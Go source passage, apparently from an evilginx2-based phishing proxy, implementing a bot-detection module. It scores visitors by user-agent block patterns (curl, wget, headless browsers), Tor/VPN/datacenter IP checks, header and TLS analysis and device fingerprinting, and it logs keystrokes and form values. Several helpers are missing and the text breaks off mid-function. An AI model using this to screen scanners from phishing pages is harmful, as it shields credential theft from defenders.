package core

import (
	"crypto/rand"
	"crypto/sha256"
	"fmt"
	"math"
	"math/big"
	"net"
	"net/http"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/kgretzky/evilginx2/log"
)

// BotGuard provides comprehensive bot detection and anti-automation protection
type BotGuard struct {
	config           *BotGuardConfig
	sessions         map[string]*BotSession
	ipReputation     map[string]*IPReputationData
	fingerprintCache map[string]*DeviceFingerprint
	behaviorAnalyzer *BehaviorAnalyzer
	captchaManager   *CaptchaManager
	mu               sync.RWMutex
	whitelistedIPs   map[string]bool
	challenges       map[string]*Challenge
}

// BotGuardConfig contains configuration for bot detection
type BotGuardConfig struct {
	Enabled              bool                    `json:"enabled"`
	StrictMode           bool                    `json:"strict_mode"`
	RequireJS            bool                    `json:"require_js"`
	MaxRequestsPerMinute int                     `json:"max_requests_per_minute"`
	BehaviorAnalysis     *BehaviorAnalysisConfig `json:"behavior_analysis"`
	CaptchaConfig        *CaptchaConfig          `json:"captcha_config"`
	ThreatScoreThreshold int                     `json:"threat_score_threshold"`
	FingerprintAnalysis  bool                    `json:"fingerprint_analysis"`
	IPReputationChecks   bool                    `json:"ip_reputation_checks"`
	GeofencingEnabled    bool                    `json:"geofencing_enabled"`
	AllowedCountries     []string                `json:"allowed_countries"`
	BlockedCountries     []string                `json:"blocked_countries"`
	DeviceConsistency    bool                    `json:"device_consistency"`
	TimingAnalysis       bool                    `json:"timing_analysis"`
}

// BehaviorAnalysisConfig contains behavior analysis settings
type BehaviorAnalysisConfig struct {
	Enabled                bool `json:"enabled"`
	MouseTrackingEnabled   bool `json:"mouse_tracking_enabled"`
	KeystrokeAnalysis      bool `json:"keystroke_analysis"`
	ScrollPatternAnalysis  bool `json:"scroll_pattern_analysis"`
	ClickPatternAnalysis   bool `json:"click_pattern_analysis"`
	HumanLikeBehaviorScore int  `json:"human_like_behavior_score"`
}

// CaptchaConfig contains CAPTCHA settings
type CaptchaConfig struct {
	Enabled         bool     `json:"enabled"`
	Type            string   `json:"type"`       // "custom", "recaptcha", "hcaptcha"
	Difficulty      string   `json:"difficulty"` // "easy", "medium", "hard"
	FallbackEnabled bool     `json:"fallback_enabled"`
	MaxAttempts     int      `json:"max_attempts"`
	TimeoutSeconds  int      `json:"timeout_seconds"`
	InvisibleMode   bool     `json:"invisible_mode"`
	CustomQuestions []string `json:"custom_questions"`
}

// BotSession tracks individual session bot detection data
type BotSession struct {
	SessionID         string             `json:"session_id"`
	IPAddress         string             `json:"ip_address"`
	UserAgent         string             `json:"user_agent"`
	StartTime         time.Time          `json:"start_time"`
	LastActivity      time.Time          `json:"last_activity"`
	RequestCount      int                `json:"request_count"`
	ThreatScore       int                `json:"threat_score"`
	BotFlags          []string           `json:"bot_flags"`
	DeviceFingerprint *DeviceFingerprint `json:"device_fingerprint"`
	BehaviorData      *BehaviorData      `json:"behavior_data"`
	ChallengesPassed  int                `json:"challenges_passed"`
	ChallengesFailed  int                `json:"challenges_failed"`
	Status            string             `json:"status"` // "clean", "suspicious", "blocked", "verified"
	GeoLocation       *GeoLocation       `json:"geo_location"`
	Whitelisted       bool               `json:"whitelisted"`
}

// DeviceFingerprint contains comprehensive device fingerprinting data
type DeviceFingerprint struct {
	FingerprintHash     string            `json:"fingerprint_hash"`
	ScreenResolution    string            `json:"screen_resolution"`
	ColorDepth          int               `json:"color_depth"`
	Timezone            string            `json:"timezone"`
	Language            string            `json:"language"`
	Platform            string            `json:"platform"`
	Plugins             []string          `json:"plugins"`
	Fonts               []string          `json:"fonts"`
	WebGLRenderer       string            `json:"webgl_renderer"`
	WebGLVendor         string            `json:"webgl_vendor"`
	TouchSupport        bool              `json:"touch_support"`
	HardwareConcurrency int               `json:"hardware_concurrency"`
	DeviceMemory        float64           `json:"device_memory"`
	MaxTouchPoints      int               `json:"max_touch_points"`
	BatteryLevel        float64           `json:"battery_level"`
	Canvas2DHash        string            `json:"canvas_2d_hash"`
	Canvas3DHash        string            `json:"canvas_3d_hash"`
	AudioContextHash    string            `json:"audio_context_hash"`
	MediaDevices        []string          `json:"media_devices"`
	NetworkType         string            `json:"network_type"`
	ConnectionSpeed     string            `json:"connection_speed"`
	Headers             map[string]string `json:"headers"`
	TLSFingerprint      string            `json:"tls_fingerprint"`
	HTTPVersion         string            `json:"http_version"`
	FirstSeen           time.Time         `json:"first_seen"`
	LastSeen            time.Time         `json:"last_seen"`
	SeenCount           int               `json:"seen_count"`
	Inconsistencies     []string          `json:"inconsistencies"`
}

// BehaviorData tracks user behavior patterns
type BehaviorData struct {
	MouseMovements   []MouseEvent     `json:"mouse_movements"`
	Keystrokes       []KeystrokeEvent `json:"keystrokes"`
	ScrollEvents     []ScrollEvent    `json:"scroll_events"`
	ClickEvents      []ClickEvent     `json:"click_events"`
	PageViews        []PageView       `json:"page_views"`
	FormInteractions []FormEvent      `json:"form_interactions"`
	TimingData       *TimingData      `json:"timing_data"`
	BehaviorScore    int              `json:"behavior_score"`
	HumanLikeScore   float64          `json:"human_like_score"`
	AnomalyFlags     []string         `json:"anomaly_flags"`
}

// Mouse event tracking
type MouseEvent struct {
	Timestamp time.Time `json:"timestamp"`
	X         int       `json:"x"`
	Y         int       `json:"y"`
	EventType string    `json:"event_type"` // "move", "click", "down", "up"
	Button    int       `json:"button"`
	Pressure  float64   `json:"pressure"`
	Velocity  float64   `json:"velocity"`
}

// Keystroke event tracking
type KeystrokeEvent struct {
	Timestamp time.Time `json:"timestamp"`
	Key       string    `json:"key"`
	EventType string    `json:"event_type"` // "down", "up", "press"
	Duration  int       `json:"duration"`
	Interval  int       `json:"interval"`
}

// Scroll event tracking
type ScrollEvent struct {
	Timestamp time.Time `json:"timestamp"`
	X         int       `json:"x"`
	Y         int       `json:"y"`
	DeltaX    int       `json:"delta_x"`
	DeltaY    int       `json:"delta_y"`
	Speed     float64   `json:"speed"`
}

// Click event tracking
type ClickEvent struct {
	Timestamp time.Time `json:"timestamp"`
	X         int       `json:"x"`
	Y         int       `json:"y"`
	Element   string    `json:"element"`
	EventType string    `json:"event_type"` // "click", "dblclick", "contextmenu"
	Duration  int       `json:"duration"`
}

// Page view tracking
type PageView struct {
	URL          string    `json:"url"`
	Title        string    `json:"title"`
	Timestamp    time.Time `json:"timestamp"`
	Duration     int       `json:"duration"`
	ScrollDepth  float64   `json:"scroll_depth"`
	Interactions int       `json:"interactions"`
}

// Form interaction tracking
type FormEvent struct {
	Timestamp   time.Time `json:"timestamp"`
	ElementID   string    `json:"element_id"`
	ElementType string    `json:"element_type"`
	EventType   string    `json:"event_type"` // "focus", "blur", "input", "submit"
	Value       string    `json:"value"`
	TypingSpeed float64   `json:"typing_speed"`
}

// Timing analysis data
type TimingData struct {
	PageLoadTime       int      `json:"page_load_time"`
	FirstInteraction   int      `json:"first_interaction"`
	AverageActionDelay float64  `json:"average_action_delay"`
	SessionDuration    int      `json:"session_duration"`
	IdleTime           int      `json:"idle_time"`
	ActiveTime         int      `json:"active_time"`
	Patterns           []string `json:"patterns"`
}

// IPReputationData contains IP reputation information
type IPReputationData struct {
	IP              string    `json:"ip"`
	ReputationScore int       `json:"reputation_score"` // 0-100
	IsTor           bool      `json:"is_tor"`
	IsVPN           bool      `json:"is_vpn"`
	IsProxy         bool      `json:"is_proxy"`
	IsDataCenter    bool      `json:"is_datacenter"`
	IsBot           bool      `json:"is_bot"`
	ThreatTypes     []string  `json:"threat_types"`
	LastChecked     time.Time `json:"last_checked"`
	Source          string    `json:"source"`
	ASN             string    `json:"asn"`
	Organization    string    `json:"organization"`
	BlockListed     bool      `json:"block_listed"`
	CountryCode     string    `json:"country_code"`
	Region          string    `json:"region"`
	City            string    `json:"city"`
}

// Challenge represents a bot challenge
type Challenge struct {
	ChallengeID    string    `json:"challenge_id"`
	Type           string    `json:"type"` // "captcha", "behavioral", "proof_of_work", "javascript"
	Created        time.Time `json:"created"`
	ExpiresAt      time.Time `json:"expires_at"`
	Difficulty     string    `json:"difficulty"`
	Question       string    `json:"question,omitempty"`
	ExpectedAnswer string    `json:"expected_answer,omitempty"`
	Attempts       int       `json:"attempts"`
	MaxAttempts    int       `json:"max_attempts"`
	Solved         bool      `json:"solved"`
	SessionID      string    `json:"session_id"`
	IPAddress      string    `json:"ip_address"`
}

// BehaviorAnalyzer analyzes user behavior patterns
type BehaviorAnalyzer struct {
	config *BehaviorAnalysisConfig
	mu     sync.RWMutex
}

// CaptchaManager handles CAPTCHA challenges
type CaptchaManager struct {
	config     *CaptchaConfig
	challenges map[string]*Challenge
	mu         sync.RWMutex
}

// NewBotGuard creates a new BotGuard instance
func NewBotGuard(config *BotGuardConfig) *BotGuard {
	if config == nil {
		config = getDefaultBotGuardConfigFunc()
	}

	bg := &BotGuard{
		config:           config,
		sessions:         make(map[string]*BotSession),
		ipReputation:     make(map[string]*IPReputationData),
		fingerprintCache: make(map[string]*DeviceFingerprint),
		behaviorAnalyzer: &BehaviorAnalyzer{config: config.BehaviorAnalysis},
		captchaManager:   &CaptchaManager{config: config.CaptchaConfig, challenges: make(map[string]*Challenge)},
		whitelistedIPs:   make(map[string]bool),
		challenges:       make(map[string]*Challenge),
	}

	// Start background cleanup routine
	go bg.backgroundCleanup()

	return bg
}

// CheckRequest analyzes incoming request for bot behavior
func (bg *BotGuard) CheckRequest(r *http.Request, sessionID string) (*BotCheckResult, error) {
	bg.mu.Lock()
	defer bg.mu.Unlock()

	if !bg.config.Enabled {
		return &BotCheckResult{Allowed: true, ThreatScore: 0}, nil
	}

	clientIP := bg.getClientIP(r)

	// Check whitelist first
	if bg.whitelistedIPs[clientIP] {
		return &BotCheckResult{Allowed: true, ThreatScore: 0, Reason: "Whitelisted IP"}, nil
	}

	// Get or create session
	session := bg.getOrCreateSession(sessionID, clientIP, r.UserAgent())

	// Update session activity
	session.LastActivity = time.Now()
	session.RequestCount++

	result := &BotCheckResult{
		SessionID:   sessionID,
		IPAddress:   clientIP,
		ThreatScore: 0,
		Allowed:     true,
		Flags:       []string{},
	}

	// Rate limiting check
	if bg.checkRateLimit(session) {
		result.ThreatScore += 30
		result.Flags = append(result.Flags, "RATE_LIMIT_EXCEEDED")
		log.Warning("Rate limit exceeded for IP: %s", clientIP)
	}

	// User Agent analysis
	if bg.analyzeUserAgent(r.UserAgent()) {
		result.ThreatScore += 25
		result.Flags = append(result.Flags, "SUSPICIOUS_USER_AGENT")
	}

	// IP reputation check
	if bg.config.IPReputationChecks {
		ipRep := bg.checkIPReputation(clientIP)
		if ipRep != nil {
			result.ThreatScore += (100 - ipRep.ReputationScore) / 4
			if ipRep.IsBot || ipRep.IsTor || ipRep.IsVPN {
				result.Flags = append(result.Flags, "SUSPICIOUS_IP")
			}
		}
	}

	// Geofencing check
	if bg.config.GeofencingEnabled {
		if !bg.checkGeofencing(clientIP) {
			result.ThreatScore += 40
			result.Flags = append(result.Flags, "GEOFENCING_VIOLATION")
		}
	}

	// Header analysis
	if bg.analyzeHeaders(r) {
		result.ThreatScore += 20
		result.Flags = append(result.Flags, "SUSPICIOUS_HEADERS")
	}

	// TLS fingerprint analysis
	if bg.analyzeTLSFingerprint(r) {
		result.ThreatScore += 15
		result.Flags = append(result.Flags, "SUSPICIOUS_TLS")
	}

	// Update session threat score
	session.ThreatScore = result.ThreatScore
	session.BotFlags = result.Flags

	// Determine if request should be blocked
	if result.ThreatScore >= bg.config.ThreatScoreThreshold {
		result.Allowed = false
		result.Reason = fmt.Sprintf("Threat score %d exceeds threshold %d", result.ThreatScore, bg.config.ThreatScoreThreshold)
		session.Status = "blocked"

		// Generate challenge if configured
		if bg.config.CaptchaConfig.Enabled {
			challenge := bg.generateChallenge(sessionID, clientIP)
			result.Challenge = challenge
		}
	}

	return result, nil
}

// AnalyzeFingerprint analyzes device fingerprint
func (bg *BotGuard) AnalyzeFingerprint(fingerprintData map[string]interface{}, sessionID string) *FingerprintAnalysisResult {
	if !bg.config.FingerprintAnalysis {
		return &FingerprintAnalysisResult{Valid: true, Score: 100}
	}

	bg.mu.Lock()
	defer bg.mu.Unlock()

	session := bg.sessions[sessionID]
	if session == nil {
		return &FingerprintAnalysisResult{Valid: false, Score: 0}
	}

	fingerprint := bg.createDeviceFingerprint(fingerprintData)
	session.DeviceFingerprint = fingerprint

	result := &FingerprintAnalysisResult{
		FingerprintHash: fingerprint.FingerprintHash,
		Valid:           true,
		Score:           100,
		Anomalies:       []string{},
	}

	// Check for common bot fingerprints
	if bg.isKnownBotFingerprint(fingerprint) {
		result.Score -= 50
		result.Anomalies = append(result.Anomalies, "KNOWN_BOT_FINGERPRINT")
	}

	// Check for impossible combinations
	if bg.hasImpossibleCombinations(fingerprint) {
		result.Score -= 40
		result.Anomalies = append(result.Anomalies, "IMPOSSIBLE_COMBINATIONS")
	}

	// Check for missing expected properties
	if bg.hasMissingProperties(fingerprint) {
		result.Score -= 30
		result.Anomalies = append(result.Anomalies, "MISSING_PROPERTIES")
	}

	// Check consistency with previous fingerprints
	if bg.config.DeviceConsistency {
		if !bg.checkFingerprintConsistency(fingerprint, session) {
			result.Score -= 35
			result.Anomalies = append(result.Anomalies, "INCONSISTENT_FINGERPRINT")
		}
	}

	if result.Score < 50 {
		result.Valid = false
	}

	return result
}

// ProcessBehaviorData processes user behavior data
func (bg *BotGuard) ProcessBehaviorData(behaviorData map[string]interface{}, sessionID string) *BehaviorAnalysisResult {
	if !bg.config.BehaviorAnalysis.Enabled {
		return &BehaviorAnalysisResult{HumanLike: true, Score: 100}
	}

	bg.mu.Lock()
	defer bg.mu.Unlock()

	session := bg.sessions[sessionID]
	if session == nil {
		return &BehaviorAnalysisResult{HumanLike: false, Score: 0}
	}

	behavior := bg.processBehaviorEvents(behaviorData)
	session.BehaviorData = behavior

	result := bg.behaviorAnalyzer.AnalyzeBehavior(behavior)

	return result
}

// GetJavaScriptChallenge generates JavaScript challenge for bot detection
func (bg *BotGuard) GetJavaScriptChallenge(sessionID string) string {
	challenge := bg.generateJavaScriptChallenge(sessionID)
	return challenge
}

// VerifyChallenge verifies a completed challenge
func (bg *BotGuard) VerifyChallenge(challengeID string, response map[string]interface{}) *ChallengeResult {
	bg.mu.Lock()
	defer bg.mu.Unlock()

	challenge := bg.challenges[challengeID]
	if challenge == nil {
		return &ChallengeResult{Valid: false, Reason: "Challenge not found"}
	}

	if time.Now().After(challenge.ExpiresAt) {
		delete(bg.challenges, challengeID)
		return &ChallengeResult{Valid: false, Reason: "Challenge expired"}
	}

	challenge.Attempts++

	if challenge.Attempts > challenge.MaxAttempts {
		delete(bg.challenges, challengeID)
		return &ChallengeResult{Valid: false, Reason: "Max attempts exceeded"}
	}

	// Verify based on challenge type
	var valid bool
	switch challenge.Type {
	case "captcha":
		valid = bg.verifyCaptcha(challenge, response)
	case "javascript":
		valid = bg.verifyJavaScriptChallenge(challenge, response)
	case "behavioral":
		valid = bg.verifyBehavioralChallenge(challenge, response)
	case "proof_of_work":
		valid = bg.verifyProofOfWork(challenge, response)
	}

	if valid {
		challenge.Solved = true
		session := bg.sessions[challenge.SessionID]
		if session != nil {
			session.ChallengesPassed++
			session.Status = "verified"
		}
		delete(bg.challenges, challengeID)
		return &ChallengeResult{Valid: true, Reason: "Challenge solved successfully"}
	}

	session := bg.sessions[challenge.SessionID]
	if session != nil {
		session.ChallengesFailed++
	}

	return &ChallengeResult{Valid: false, Reason: "Invalid challenge response"}
}

// Helper methods...

func getDefaultBotGuardConfigFunc() *BotGuardConfig {
	return &BotGuardConfig{
		Enabled:              true,
		StrictMode:           false,
		RequireJS:            true,
		MaxRequestsPerMinute: 60,
		ThreatScoreThreshold: 70,
		FingerprintAnalysis:  true,
		IPReputationChecks:   true,
		GeofencingEnabled:    false,
		DeviceConsistency:    true,
		TimingAnalysis:       true,
		BehaviorAnalysis: &BehaviorAnalysisConfig{
			Enabled:                true,
			MouseTrackingEnabled:   true,
			KeystrokeAnalysis:      true,
			ScrollPatternAnalysis:  true,
			ClickPatternAnalysis:   true,
			HumanLikeBehaviorScore: 70,
		},
		CaptchaConfig: &CaptchaConfig{
			Enabled:         true,
			Type:            "custom",
			Difficulty:      "medium",
			FallbackEnabled: true,
			MaxAttempts:     3,
			TimeoutSeconds:  300,
			InvisibleMode:   false,
		},
	}
}

func (bg *BotGuard) getClientIP(r *http.Request) string {
	// Check various headers for real IP
	headers := []string{"X-Real-IP", "X-Forwarded-For", "CF-Connecting-IP", "X-Client-IP"}

	for _, header := range headers {
		ip := r.Header.Get(header)
		if ip != "" {
			// Handle comma-separated IPs (X-Forwarded-For)
			if strings.Contains(ip, ",") {
				ip = strings.TrimSpace(strings.Split(ip, ",")[0])
			}
			if net.ParseIP(ip) != nil {
				return ip
			}
		}
	}

	// Fallback to remote address
	host, _, _ := net.SplitHostPort(r.RemoteAddr)
	return host
}

func (bg *BotGuard) getOrCreateSession(sessionID, ip, userAgent string) *BotSession {
	session, exists := bg.sessions[sessionID]
	if !exists {
		session = &BotSession{
			SessionID:    sessionID,
			IPAddress:    ip,
			UserAgent:    userAgent,
			StartTime:    time.Now(),
			LastActivity: time.Now(),
			RequestCount: 0,
			ThreatScore:  0,
			BotFlags:     []string{},
			Status:       "clean",
		}
		bg.sessions[sessionID] = session
	}
	return session
}

// Additional helper methods would continue here...
// (checkRateLimit, analyzeUserAgent, checkIPReputation, etc.)

// BotCheckResult contains the result of bot analysis
type BotCheckResult struct {
	SessionID   string     `json:"session_id"`
	IPAddress   string     `json:"ip_address"`
	Allowed     bool       `json:"allowed"`
	ThreatScore int        `json:"threat_score"`
	Flags       []string   `json:"flags"`
	Reason      string     `json:"reason,omitempty"`
	Challenge   *Challenge `json:"challenge,omitempty"`
}

// FingerprintAnalysisResult contains fingerprint analysis results
type FingerprintAnalysisResult struct {
	FingerprintHash string   `json:"fingerprint_hash"`
	Valid           bool     `json:"valid"`
	Score           int      `json:"score"`
	Anomalies       []string `json:"anomalies"`
}

// BehaviorAnalysisResult contains behavior analysis results
type BehaviorAnalysisResult struct {
	HumanLike bool     `json:"human_like"`
	Score     float64  `json:"score"`
	Anomalies []string `json:"anomalies"`
}

// ChallengeResult contains challenge verification results
type ChallengeResult struct {
	Valid  bool   `json:"valid"`
	Reason string `json:"reason"`
}

// Full implementations for bot detection methods
func (bg *BotGuard) checkRateLimit(session *BotSession) bool {
	// Check requests per minute
	if time.Since(session.StartTime).Minutes() < 1 {
		return session.RequestCount > bg.config.MaxRequestsPerMinute
	}

	// Reset counter if more than a minute has passed
	if time.Since(session.LastActivity).Minutes() > 1 {
		session.RequestCount = 1
		return false
	}

	return session.RequestCount > bg.config.MaxRequestsPerMinute
}

func (bg *BotGuard) analyzeUserAgent(userAgent string) bool {
	// Known bot patterns
	botPatterns := []string{
		"bot", "crawler", "spider", "scraper", "python", "requests", "curl", "wget",
		"selenium", "phantom", "headless", "automated", "test", "scan", "monitor",
		"libwww", "httpclient", "apache-", "java/", "okhttp", "node-fetch",
		"puppeteer", "playwright", "nightmare", "mechanize", "scrapy",
	}

	userAgentLower := strings.ToLower(userAgent)

	for _, pattern := range botPatterns {
		if strings.Contains(userAgentLower, pattern) {
			return true
		}
	}

	// Check for suspiciously short or long user agents
	if len(userAgent) < 10 || len(userAgent) > 500 {
		return true
	}

	// Check for missing common browser identifiers
	if !strings.Contains(userAgentLower, "mozilla") &&
		!strings.Contains(userAgentLower, "chrome") &&
		!strings.Contains(userAgentLower, "firefox") &&
		!strings.Contains(userAgentLower, "safari") &&
		!strings.Contains(userAgentLower, "edge") {
		return true
	}

	return false
}

func (bg *BotGuard) checkIPReputation(ip string) *IPReputationData {
	// Check cache first
	if rep, exists := bg.ipReputation[ip]; exists {
		if time.Since(rep.LastChecked).Hours() < 24 {
			return rep
		}
	}

	// Create basic reputation data
	rep := &IPReputationData{
		IP:              ip,
		ReputationScore: 100,
		LastChecked:     time.Now(),
		Source:          "internal",
	}

	// Check if IP is in known ranges
	if bg.isDataCenterIP(ip) {
		rep.IsDataCenter = true
		rep.ReputationScore -= 30
		rep.ThreatTypes = append(rep.ThreatTypes, "datacenter")
	}

	if bg.isTorExitNode(ip) {
		rep.IsTor = true
		rep.ReputationScore -= 50
		rep.ThreatTypes = append(rep.ThreatTypes, "tor")
	}

	if bg.isKnownVPN(ip) {
		rep.IsVPN = true
		rep.ReputationScore -= 40
		rep.ThreatTypes = append(rep.ThreatTypes, "vpn")
	}

	// Cache the result
	bg.ipReputation[ip] = rep
	return rep
}

func (bg *BotGuard) checkGeofencing(ip string) bool {
	if !bg.config.GeofencingEnabled {
		return true
	}

	// Get country code (simplified implementation)
	countryCode := bg.getCountryCode(ip)

	// Check blocked countries
	for _, blocked := range bg.config.BlockedCountries {
		if countryCode == blocked {
			return false
		}
	}

	// Check allowed countries (if specified)
	if len(bg.config.AllowedCountries) > 0 {
		for _, allowed := range bg.config.AllowedCountries {
			if countryCode == allowed {
				return true
			}
		}
		return false
	}

	return true
}

func (bg *BotGuard) analyzeHeaders(r *http.Request) bool {
	// Check for missing common headers
	requiredHeaders := []string{"Accept", "Accept-Language", "Accept-Encoding"}
	for _, header := range requiredHeaders {
		if r.Header.Get(header) == "" {
			return true
		}
	}

	// Check for suspicious header values
	accept := r.Header.Get("Accept")
	if accept == "*/*" || accept == "" {
		return true
	}

	// Check for automation framework headers
	automationHeaders := []string{
		"X-Selenium", "X-Puppeteer", "X-Playwright", "X-PhantomJS",
		"X-Automated", "X-Test", "X-Bot", "X-Scraper",
	}

	for _, header := range automationHeaders {
		if r.Header.Get(header) != "" {
			return true
		}
	}

	// Check header order (browsers send headers in specific order)
	headerOrder := bg.getHeaderOrder(r)
	if bg.isSuspiciousHeaderOrder(headerOrder) {
		return true
	}

	return false
}

func (bg *BotGuard) analyzeTLSFingerprint(r *http.Request) bool {
	// Check TLS version and cipher suites (simplified)
	if r.TLS == nil {
		return false // Non-HTTPS request
	}

	// Check for outdated TLS versions
	if r.TLS.Version < 0x0303 { // TLS 1.2
		return true
	}

	// Check for unusual cipher suites commonly used by bots
	suspiciousCiphers := []uint16{0x0005, 0x000a, 0x002f, 0x0035}
	for _, cipher := range suspiciousCiphers {
		if r.TLS.CipherSuite == cipher {
			return true
		}
	}

	return false
}

func (bg *BotGuard) generateChallenge(sessionID, ip string) *Challenge {
	challengeID := bg.generateRandomString(32)

	challenge := &Challenge{
		ChallengeID: challengeID,
		Type:        bg.config.CaptchaConfig.Type,
		Created:     time.Now(),
		ExpiresAt:   time.Now().Add(time.Duration(bg.config.CaptchaConfig.TimeoutSeconds) * time.Second),
		Difficulty:  bg.config.CaptchaConfig.Difficulty,
		Attempts:    0,
		MaxAttempts: bg.config.CaptchaConfig.MaxAttempts,
		Solved:      false,
		SessionID:   sessionID,
		IPAddress:   ip,
	}

	// Generate challenge based on type
	switch challenge.Type {
	case "captcha":
		challenge.Question, challenge.ExpectedAnswer = bg.generateMathCaptcha(challenge.Difficulty)
	case "javascript":
		challenge.Question = bg.generateJavaScriptChallenge(sessionID)
	case "proof_of_work":
		challenge.Question, challenge.ExpectedAnswer = bg.generateProofOfWorkChallenge(challenge.Difficulty)
	}

	bg.challenges[challengeID] = challenge
	return challenge
}

func (bg *BotGuard) createDeviceFingerprint(data map[string]interface{}) *DeviceFingerprint {
	fp := &DeviceFingerprint{
		FirstSeen: time.Now(),
		LastSeen:  time.Now(),
		SeenCount: 1,
		Headers:   make(map[string]string),
	}

	// Extract fingerprint data
	if screen, ok := data["screen_resolution"].(string); ok {
		fp.ScreenResolution = screen
	}
	if depth, ok := data["color_depth"].(float64); ok {
		fp.ColorDepth = int(depth)
	}
	if tz, ok := data["timezone"].(string); ok {
		fp.Timezone = tz
	}
	if lang, ok := data["language"].(string); ok {
		fp.Language = lang
	}
	if platform, ok := data["platform"].(string); ok {
		fp.Platform = platform
	}
	if plugins, ok := data["plugins"].([]interface{}); ok {
		for _, plugin := range plugins {
			if p, ok := plugin.(string); ok {
				fp.Plugins = append(fp.Plugins, p)
			}
		}
	}
	if fonts, ok := data["fonts"].([]interface{}); ok {
		for _, font := range fonts {
			if f, ok := font.(string); ok {
				fp.Fonts = append(fp.Fonts, f)
			}
		}
	}
	if renderer, ok := data["webgl_renderer"].(string); ok {
		fp.WebGLRenderer = renderer
	}
	if vendor, ok := data["webgl_vendor"].(string); ok {
		fp.WebGLVendor = vendor
	}
	if touch, ok := data["touch_support"].(bool); ok {
		fp.TouchSupport = touch
	}
	if concurrency, ok := data["hardware_concurrency"].(float64); ok {
		fp.HardwareConcurrency = int(concurrency)
	}
	if memory, ok := data["device_memory"].(float64); ok {
		fp.DeviceMemory = memory
	}
	if maxTouch, ok := data["max_touch_points"].(float64); ok {
		fp.MaxTouchPoints = int(maxTouch)
	}
	if battery, ok := data["battery_level"].(float64); ok {
		fp.BatteryLevel = battery
	}

	// Generate fingerprint hash
	fp.FingerprintHash = bg.generateFingerprintHash(fp)

	return fp
}

func (bg *BotGuard) isKnownBotFingerprint(fp *DeviceFingerprint) bool {
	// Check for common headless browser fingerprints
	headlessSignatures := []string{
		"HeadlessChrome", "PhantomJS", "SlimerJS", "HtmlUnit",
		"Selenium", "WebDriver", "Puppeteer", "Playwright",
	}

	for _, sig := range headlessSignatures {
		if strings.Contains(fp.WebGLRenderer, sig) ||
			strings.Contains(fp.WebGLVendor, sig) ||
			strings.Contains(fp.Platform, sig) {
			return true
		}
	}

	// Check for impossible hardware combinations
	if fp.HardwareConcurrency <= 0 || fp.HardwareConcurrency > 64 {
		return true
	}

	if fp.DeviceMemory <= 0 || fp.DeviceMemory > 32 {
		return true
	}

	return false
}

func (bg *BotGuard) hasImpossibleCombinations(fp *DeviceFingerprint) bool {
	// Mobile platform with no touch support
	mobilePlatforms := []string{"iPhone", "iPad", "Android", "Windows Phone"}
	for _, platform := range mobilePlatforms {
		if strings.Contains(fp.Platform, platform) && !fp.TouchSupport {
			return true
		}
	}

	// Desktop platform with touch points > 0
	desktopPlatforms := []string{"Win32", "Linux x86_64", "MacIntel"}
	for _, platform := range desktopPlatforms {
		if strings.Contains(fp.Platform, platform) && fp.MaxTouchPoints > 10 {
			return true
		}
	}

	// Check screen resolution consistency
	if fp.ScreenResolution != "" {
		parts := strings.Split(fp.ScreenResolution, "x")
		if len(parts) == 2 {
			width, _ := strconv.Atoi(parts[0])
			height, _ := strconv.Atoi(parts[1])

			// Impossible resolutions
			if width <= 0 || height <= 0 || width > 10000 || height > 10000 {
				return true
			}

			// Common bot resolutions
			botResolutions := []string{"1024x768", "800x600", "1920x1080"}
			for _, res := range botResolutions {
				if fp.ScreenResolution == res && len(fp.Plugins) == 0 {
					return true
				}
			}
		}
	}

	return false
}

func (bg *BotGuard) hasMissingProperties(fp *DeviceFingerprint) bool {
	// Essential properties that should be present
	if fp.ScreenResolution == "" ||
		fp.Language == "" ||
		fp.Platform == "" ||
		fp.Timezone == "" {
		return true
	}

	// Browsers should have some plugins or fonts
	if len(fp.Plugins) == 0 && len(fp.Fonts) == 0 {
		return true
	}

	// WebGL should be available in modern browsers
	if fp.WebGLRenderer == "" && fp.WebGLVendor == "" {
		return true
	}

	return false
}

func (bg *BotGuard) checkFingerprintConsistency(fp *DeviceFingerprint, session *BotSession) bool {
	if session.DeviceFingerprint == nil {
		return true // First fingerprint
	}

	prev := session.DeviceFingerprint

	// Check for major inconsistencies
	if fp.Platform != prev.Platform ||
		fp.ScreenResolution != prev.ScreenResolution ||
		fp.Language != prev.Language ||
		fp.Timezone != prev.Timezone {
		fp.Inconsistencies = append(fp.Inconsistencies, "DEVICE_CHANGE")
		return false
	}

	// Check hardware consistency
	if math.Abs(float64(fp.HardwareConcurrency-prev.HardwareConcurrency)) > 0 ||
		math.Abs(fp.DeviceMemory-prev.DeviceMemory) > 1 {
		fp.Inconsistencies = append(fp.Inconsistencies, "HARDWARE_CHANGE")
		return false
	}

	return true
}

func (bg *BotGuard) processBehaviorEvents(data map[string]interface{}) *BehaviorData {
	behavior := &BehaviorData{
		MouseMovements:   []MouseEvent{},
		Keystrokes:       []KeystrokeEvent{},
		ScrollEvents:     []ScrollEvent{},
		ClickEvents:      []ClickEvent{},
		PageViews:        []PageView{},
		FormInteractions: []FormEvent{},
		TimingData:       &TimingData{},
		BehaviorScore:    100,
		HumanLikeScore:   1.0,
		AnomalyFlags:     []string{},
	}

	// Process mouse movements
	if movements, ok := data["mouse_movements"].([]interface{}); ok {
		for _, mov := range movements {
			if m, ok := mov.(map[string]interface{}); ok {
				event := MouseEvent{}
				if x, ok := m["x"].(float64); ok {
					event.X = int(x)
				}
				if y, ok := m["y"].(float64); ok {
					event.Y = int(y)
				}
				if ts, ok := m["timestamp"].(float64); ok {
					event.Timestamp = time.Unix(int64(ts/1000), 0)
				}
				if eventType, ok := m["type"].(string); ok {
					event.EventType = eventType
				}
				behavior.MouseMovements = append(behavior.MouseMovements, event)
			}
		}
	}

	// Process keystrokes
	if keystrokes, ok := data["keystrokes"].([]interface{}); ok {
		for _, key := range keystrokes {
			if k, ok := key.(map[string]interface{}); ok {
				event := KeystrokeEvent{}
				if keyCode, ok := k["key"].(string); ok {
					event.Key = keyCode
				}
				if ts, ok := k["timestamp"].(float64); ok {
					event.Timestamp = time.Unix(int64(ts/1000), 0)
				}
				if eventType, ok := k["type"].(string); ok {
					event.EventType = eventType
				}
				behavior.Keystrokes = append(behavior.Keystrokes, event)
			}
		}
	}

	// Process scroll events
	if scrolls, ok := data["scroll_events"].([]interface{}); ok {
		for _, scroll := range scrolls {
			if s, ok := scroll.(map[string]interface{}); ok {
				event := ScrollEvent{}
				if x, ok := s["x"].(float64); ok {
					event.X = int(x)
				}
				if y, ok := s["y"].(float64); ok {
					event.Y = int(y)
				}
				if ts, ok := s["timestamp"].(float64); ok {
					event.Timestamp = time.Unix(int64(ts/1000), 0)
				}
